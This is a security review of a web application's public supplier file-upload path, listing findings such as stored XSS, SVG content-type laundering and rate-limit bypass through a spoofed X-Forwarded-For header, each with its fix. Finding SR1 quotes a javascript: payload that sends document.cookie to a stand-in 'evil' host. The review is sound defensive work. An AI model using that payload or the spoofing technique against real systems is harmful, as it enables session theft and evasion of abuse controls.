# Security review — the supplier-door file upload path (2026-08-17)

**Scope.** The public, token-authenticated "supplier door" (Phase 21.4 +
22.1): an external supplier follows an expiring link and uploads a document
that internal operators later consult. This is the review the 22.1 commit
marked as a MUST-DO before GA traffic. It covers the four door endpoints,
the object-storage seam they write to, the routes that later serve stored
bytes, and the UI that renders supplier-submitted values.

**Method.** Code read of every path from the token to the rendered pixel.
No pentest tooling; findings are code-cited and each carries a disposition:
FIXED (this phase), ACCEPTED (with rationale), or NOTED (out of the door's
scope, recorded so it is not lost).

## Attack surface

Public (no session), token-scoped, behind the door rate limiter (per-IP,
20/min):
- `POST /api/conformity/supplier-portal/upload-url` — mint a one-time upload URL.
- `PUT  /api/conformity/supplier-portal/upload/:id?token=` — accept raw bytes.
- `POST /api/conformity/supplier-portal/submit` — record url/note/objectPath.
- `GET  /api/conformity/supplier-portal/workspace?token=` — read the ask.

The token must resolve to an OPEN, unexpired, unwithdrawn ask
(`loadOpenRequestByToken`); an invalid token answers identically to an
expired one (no enumeration). Stored objects land under
`<OBJECT_STORAGE_DIR>/private/objects/uploads/<uuid>` with a traversal
refusal in the local backend.

## Findings

| ID | Severity | Title | Disposition |
|----|----------|-------|-------------|
| SR1 | High | Stored XSS via the `url` field (`javascript:` scheme) | FIXED |
| SR2 | High | Content-type laundering / scriptable SVG stored | FIXED |
| SR3 | Medium | Door-uploaded bytes have no serve route (product gap) | FIXED |
| SR4 | High | `trust proxy: true` lets a client spoof its rate-limit IP | FIXED |
| SR5 | Medium | Unbounded upload-URL mints per ask (disk fill) | FIXED |
| SR6 | Low | Admin media registration accepts arbitrary objectPath | NOTED |
| SR7 | Info | ACL layer is dead code (route-level auth only) | NOTED |
| SR8 | Low | Internal supplier-doc POST accepts any objectPath | FIXED |
| SR9 | Info | Evidence downloads are served `inline` | ACCEPTED |

### SR1 — Stored XSS via `url` (High, FIXED)
The door `submit` and the internal document POST stored `url` verbatim, and
the operator panel renders it as `<a href={d.url}>open link</a>`
(`operator-procurement-panel.tsx`). A supplier could submit
`url: "javascript:fetch('//evil/'+document.cookie)"`; an operator clicking
"open link" runs it in the app origin. **Fix:** both writers now require
`url` to parse as an absolute `http:`/`https:` URL, else 400. Helmet's CSP
(`script-src 'self'`) is defence in depth, not the primary control — a
`javascript:` navigation is a top-level nav the CSP does not stop, so the
scheme allow-list is the real fix.

### SR2 — Content-type laundering / scriptable SVG (High, FIXED)
The shared allow-list (`routes/storage.ts`) admits `svg` and accepts any
`image/*` content-type, and the bytes-carrying PUT stored the uploader's
*declared* Content-Type without re-checking it. A supplier could store
`image/svg+xml` (SVG carries script) or HTML mislabelled as an image, to be
weaponised the moment those bytes are served inline. **Fix:** the DOOR now
(a) rejects the `svg` extension at mint, (b) rejects any content-type not in
the strict allow-list — no blanket `image/*` pass for the public door — and
(c) re-validates the actual `Content-Type` request header at PUT time before
writing. The internal admin flow is unchanged (trusted uploader). Combined
with SR3's `attachment` serving, stored bytes cannot execute in the app
origin.

### SR3 — No serve route for supplier documents (Medium, FIXED)
There was no way for an internal user to download what a supplier uploaded —
the panel showed only a sha256 prefix. This was a genuine product gap (the
document arrives and then vanishes into storage) AND the reason SR2 was not
yet exploitable. **Fix:** a new `GET /conformity/supplier-documents/:id/
download` (`requireAuth`), streaming via the storage seam with
`Content-Disposition: attachment` — the browser saves the file rather than
rendering it, so a hostile SVG/HTML never executes in-origin. The panel
gains a "download" link on rows that carry an `objectPath`.

### SR4 — `trust proxy: true` (High, FIXED)
`app.set("trust proxy", true)` trusted the entire `X-Forwarded-For` chain,
so a client could prepend arbitrary hops and present any source IP. That
defeats the per-IP door limiter (rotate spoofed IPs → unlimited mints/PUTs)
and pollutes the login limiter's keys. The deployment is exactly one nginx
hop. **Fix:** `trust proxy` → `1`. Express then reads only the last
(nginx-appended) XFF entry, which the client cannot forge. This strengthens
the login rate limiter as a side effect and weakens no control.

### SR5 — Unbounded mints per ask (Medium, FIXED)
`upload-url` could be called without limit for one open ask; each mint
reserves a one-time id and a subsequent 50 MB PUT, and unlinked uploads were
never swept. With SR4 fixed the per-IP limiter already caps burst, but a
patient attacker over hours could still accrete orphan bytes. **Fix:** a
`uploads_minted` counter on `conformity_supplier_requests`, incremented per
mint, capped at 10 per ask (400 beyond) — the honest ceiling for "answer one
document request" while bounding orphan bytes per token. The per-IP door
limiter was also RAISED (20 → 60/min): 20 was too tight for suppliers behind
a shared corporate NAT, and the expensive operation (a 50 MB upload) is now
bounded far more tightly by the per-ask mint cap than the IP limiter ever
was — so overall abuse resistance goes up, not down. A background
orphan-sweeper is recorded as a future candidate, not built: bytes are now
bounded per ask and no ops data yet justifies the machinery.

### SR6 — Admin media registration accepts arbitrary objectPath (Low, NOTED)
`adminMedia.ts` registers any caller-supplied path as public media without
checking how it was minted. Admin-gated and outside the door's surface;
recorded here so a future media-hardening pass has the pointer.

### SR7 — ACL layer is dead code (Info, NOTED)
`trySetObjectEntityAclPolicy` / `canAccessObject` have zero call sites;
authorization is entirely route-level (`requireAuth` + the media-registration
check). The ACL machinery is fail-closed if ever invoked (no metadata →
deny). We rely on route-level auth by design; documented honestly rather
than pretending an ACL layer is active. Wiring it up is a larger,
separate hardening effort.

### SR8 — Internal supplier-doc POST accepts any objectPath (Low, FIXED)
The door submit enforced the `/objects/uploads/` prefix; the internal
(authenticated) supplier-document POST did not. Low risk (auth'd caller) but
free to close. **Fix:** the internal POST now requires an empty or
`/objects/`-prefixed path.

### SR9 — Evidence downloads served `inline` (Info, ACCEPTED)
The pre-existing evidence download route sets `Content-Disposition: inline`
for in-browser PDF viewing. Its uploaders are authenticated internal users,
and helmet CSP + `nosniff` bound the blast radius. We accept `inline` there
and deliberately choose `attachment` for the NEW supplier-document route,
because its source is untrusted. The differing choice is the point, not an
inconsistency.

## Residual risk after this phase
- Untrusted bytes are stored but only ever served as `attachment` to an
  authenticated user; they cannot execute in the app origin.
- Rate limiting is now spoof-resistant (single trusted hop) and mint volume
  is bounded per ask.
- Not addressed (accepted for now): antivirus scanning of uploaded bytes,
  and a background sweeper for orphaned mints. Both recorded as candidates.

## Sign-off
The door upload path is fit for GA traffic with SR1–SR5 and SR8 fixed and
SR6/SR7/SR9 dispositioned above. Re-review if the door ever serves bytes
inline, drops the attachment disposition, or is exposed behind more than one
proxy hop.
